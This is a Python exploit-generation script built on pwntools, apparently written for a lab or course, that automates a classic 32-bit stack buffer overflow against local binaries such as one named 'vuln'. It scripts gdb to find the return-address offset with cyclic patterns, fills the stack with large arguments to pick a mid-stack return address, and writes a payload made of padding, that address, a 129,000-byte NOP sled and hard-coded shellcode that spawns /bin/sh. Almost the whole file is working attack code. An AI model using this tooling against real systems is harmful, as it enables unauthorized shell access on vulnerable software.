from pwn import *
from utils import cleanup

def generate_testcase():
    return cyclic(10000)


def locate_ra(pattern, target):

    gdb_proc = subprocess.Popen(
        [f"gdb -q {target}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    #send the pattern to the gdb target proc from both the arguments and stdin 
    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
    commands = f"""
    set pagination off
    set disable-randomization off
    r {pattern.decode('latin-1')}
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        # print(output)
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("info frame\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("x/40x $esp-1100\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    # print(output)
    # print(pattern)
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    # print(eip_value)

    offset = cyclic_find(int(eip_value, 16))
    # print(f"offset: {offset}")
    return offset


def locate_ra3(pattern, target):
    gdb_proc = subprocess.Popen(
        [f"gdb -q {target}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    #send the pattern to the gdb target proc from both the arguments and stdin 
    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
    commands = f"""
    set pagination off
    r c
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        # print(output)
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("bt\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    print(output)
    # print(pattern)
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    # print(eip_value)

    offset = cyclic_find(0x66616166)
    address = struct.pack("<I", 0xffffd5b4)
    new_pattern = pattern[:offset] + address + pattern[offset + 4:]


    #now run again with the new pattern

    gdb_proc = subprocess.Popen(
        [f"gdb -q {target}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    #send the pattern to the gdb target proc from both the arguments and stdin 
    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
    commands = f"""
    set pagination off
    r c
    {new_pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        # print(output)
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info frame\n")
    gdb_proc.stdin.flush()


    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("bt\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    print(output)


    return offset

def locate_ra2(pattern, target):
        
    crash_proc = process(
        [target, 
        pattern.decode('latin-1')]
    )
        
    crash_proc.sendline(pattern.decode('latin-1'))      #sending the crash pattern via stdin for the binaries that consume input from standard input

    if crash_proc.poll(True) != 0:
        print(f"Process crashed with return code {crash_proc.poll(True)}")

    core = crash_proc.corefile          #problem with core files -> core dumps are piped in a program named apport that handles sensitive data ?? idek
    if core != None:
        print(f"eip val after crash: {core.eip}")
    else:
        print("No core file found")

        
def target_ra(target):

    #find in what adresses the stack fluctuates -> info proc mapping

    #first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
    trash = b'B'*131000
    trash_args = "`cat trash` " * 15    
    open("trash", "wb").write(trash)  

    gdb_process = subprocess.Popen(
        f"gdb {target}", 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True, 
        shell=True
    )

    commands = f"""
    set disable-randomization off
    set breakpoint pending on
    b main
    r {trash_args}
    info proc mapping
    q
    y
    """

    gdb_process.stdin.write(commands)
    gdb_process.stdin.flush()
    output, _ = gdb_process.communicate()

    return output


def stack_middle_address(output):

    # Find the line containing the word "stack" and extract the address in the middle
    output_lines = output.split('\n')
    stack_line = next((line for line in output_lines if 'stack' in line), None)
    
    if stack_line is None:
        print("GDB failed to find the stack line.")
        cleanup(1)
    
    pattern = r'\b0x[0-9a-f]+\b'
    matches = re.findall(pattern, stack_line)
    
    start_address = int(matches[0], 16)
    end_address = int(matches[1], 16)
    
    middle = (start_address + end_address) // 2
    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

    # print(f"stack middle target addr: {hex(middle)}")
    return middle


def build_payload(offset, target):

    middle = stack_middle_address(target_ra(target))
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    #!!! will change
    if target == 'vuln':
        offset += 4 
    #!!!

    payload = b'A' * offset
    payload += struct.pack("<I", middle)
    payload += b'\x90' * 129000
    payload += shellcode

    open("payload", "wb").write(payload)
